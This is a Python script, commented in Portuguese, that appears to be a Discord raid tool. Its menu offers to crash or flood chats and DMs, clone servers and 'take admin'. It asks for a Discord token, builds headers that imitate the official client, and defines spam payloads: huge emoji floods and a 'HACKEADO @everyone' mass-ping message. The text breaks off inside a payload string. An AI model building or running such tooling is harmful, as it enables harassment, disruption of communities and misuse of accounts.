##-*- coding: utf-8 -*-
##  O código localizado entre o try: e o except é executado de forma que se algo de errado acontecer ali, o except Exception vai imediatamente chamar o código localizado abaixo de si para realizar o tratamento da exceção
import os
try:
    import discord
    import requests
    import json
    import time
    import random
    from time import sleep
except Exception:
    os.system("cls")
##  Carregando Depedencias...
    print('Baixando... Aguarde Criado Por Zk')
    os.system('pip install requests')
    print('Baixando...Aguarde')
    os.system('pip install python')
    print('Baixando...')
    os.system('npm isntall i')
    input('Estalado com sucesso APERTE enter para sair.')
    exit()
##  Carregamento De Logo
##  Carregamento De Logo
logo = """
         _______  .______          ___       _______   ______   .__   __. 
        |       \ |   _  \        /   \     /  _____| /  __  \  |  \ |  | 
        |  .--.  ||  |_)  |      /  ^  \   |  |  __  |  |  |  | |   \|  | 
        |  |  |  ||      /      /  /_\  \  |  | |_ | |  |  |  | |  . `  | 
        |  '--'  ||  |\  \----./  _____  \ |  |__| | |  `--'  | |  |\   | 
        |_______/ | _| `._____/__/     \__\ \______|  \______/  |__| \__| 
        
          @criado por: zk discord: zk#8075  date: 27/11/2020 time: 23:44                                                                
"""
## Comandos do Menu
## Comando do Menu
os.system("cls")
os.system("color 0c")
print(logo)

print('---------------------------------------')
print('Escreva Abaixo Qual Opção Deseja Usar:')
print('---------------------------------------')
print('\n [1] -> Travar Um Chat')
print('\n [2] -> Travar Privado')
print('\n [3] -> Clonar Discord')
print('\n [4] -> Pegar Adm Discord\n')
print('---------------------------------------')
try:
    groupORdm = str(input("Sua Escolha -> ")).strip().lower()
## Comando Linha    [1]
    if groupORdm == '1':
        os.system('cls')
        print(logo)
        token = str(input("Seu Token -> ")).strip() # Aqui Estou solicitando que o usuario insira o TOKEN.

        headers = {'Authorization':token,'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.12 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36'}
        os.system('cls')
        payload1 = {'content':'**---------------------------------**'}
        payload1 = {'content':'**🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🙈🙉🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐵🐒🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈🙉🙊🐒🐵🙈**'}
        
        payload2 = {'content':'**HACKEADO @everyone @everyone @everyone @everyone HACKEADO @everyone @everyone @everyone @everyone HACKEADO @everyone @everyone @everyone @everyone HACKEADO @everyone @everyone @everyone @everyone HACKEADO @everyone @everyone @everyone @everyone**'}
        
        payload3 = {'content':'**🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹🦸🦸‍♀️🧚‍♀️🥷🦹